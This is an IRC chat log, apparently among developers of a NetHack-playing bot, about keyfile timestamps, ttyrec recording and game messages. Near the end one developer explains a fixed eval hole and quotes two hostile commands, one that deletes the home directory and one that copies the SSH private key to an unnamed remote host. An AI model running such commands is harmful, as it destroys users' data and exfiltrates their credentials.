[00:45:03] <@toft> do you guys really like that date format of the keyfiles?
[00:45:09] <@toft> in here
[00:45:17] <@toft> runcible might asplode
[00:45:41] <@Eidolos> it should be the same as used by nao
[00:45:43] <@Eidolos> I'm just lazy
[00:45:54] <@Eidolos> quick, disable monster-rename
[00:45:54] <@toft> I'll do it if you want, after this game
[00:45:59] <@Eidolos> killjoys
[00:47:31] <@Eidolos> doy: you only need to record one or the other
[00:47:52] <@doy> eh
[00:48:24] <@Eidolos> I mean ttyrec
[00:48:32] <@Eidolos> it'll grep from either one
[00:48:39] <@doy> yeah, eh
[00:48:40] <@doy> (:
[00:48:51] <@Eidolos> I also don't think it's important to record straight-NH ttyrecs, since those are available on NAO
[00:49:08] <@toft> I concur
[00:49:43] <@toft> hmm
[00:49:51] <@toft> magic traps make You feel tired. non-unique
[00:49:53] <@toft> how annoying
[00:49:59] <@doy> toft: yeah, nothing much can be done about that
[00:50:17] <@Eidolos> could check to see if a gremlin chuckled very recently
[00:50:23] <@toft> or could prompt
[00:50:27] <@Eidolos> meh
[00:50:40] <@Eidolos> automate internal state if possible

[12:17:03] <@toft> I fixed the timestamps
[12:17:12] <@Eidolos> oh nice
[12:17:13] <@Eidolos> thanks
[12:17:35] <@toft> what was the hole?
[12:18:05] <@Eidolos> :)
[12:18:06] <@Eidolos> well
[12:18:09] <@Eidolos> if you're watching someone
[12:18:44] <@Eidolos> they can use #eval system("rm -rf $ENV{HOME}")
[12:18:47] <@Eidolos> or worse
[12:18:56] <@toft> oh snap
[12:18:57] <@toft> heh
[12:19:00] <@Eidolos> they can use #eval system("scp ~/.ssh/id_rsa <somewhere>")
[12:19:46] <@Eidolos> bah, I hate when I accidentally resize a term
[12:20:44] <@Eidolos> ok KDE lets you force a size on it, cool
[12:22:09] <@toft> I just moved all my old ttyrecs and keyfiles to an archive folder
[12:22:18] <@toft> could convert i gues but not worth my effort :)
[12:22:33] <@Eidolos> script it!
[12:22:54] <@toft> archive folder is good enough for me! I will probabl be never looking at them again anyway so
